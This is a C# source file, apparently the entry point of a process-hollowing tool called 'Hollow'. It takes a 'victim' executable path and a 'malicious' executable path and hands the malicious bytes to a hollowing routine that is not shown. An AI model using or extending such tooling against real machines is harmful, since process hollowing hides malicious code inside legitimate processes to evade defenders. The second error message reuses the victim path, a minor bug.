using CommandLine;
using System;
using System.IO;

namespace Hollow
{
    class Options
    {
        [Option('v', "vprocess", Required = true, HelpText = "The victim's process file pathway")]
        public string vProcess { get; set; }
        [Option('m', "mprocess", Required = true, HelpText = "The malicious's process file pathway")]
        public string mProcess { get; set; }
    }
    internal class Program
    {
        static void Main(string[] args)
        {
            Parser.Default.ParseArguments<Options>(args).WithParsed<Options>(arg =>
            {
                if (!File.Exists(arg.vProcess))
                {
                    Console.WriteLine($"[X] The \"victim\" file could not be found ({arg.vProcess})");
                    return;
                }
                else if (!File.Exists(arg.mProcess))
                {
                    Console.WriteLine($"[X] The \"malicious\" file could not be found ({arg.vProcess})");
                    return;
                }
                Utils.Banner();
                ProcessHollow processhollowing = new ProcessHollow();
                byte[] malicious = File.ReadAllBytes(arg.mProcess);
                processhollowing.Hollowing(arg.vProcess, malicious);
            });
            Console.Write("Press Enter to exit...");
            Console.ReadKey();
        }
    }
}
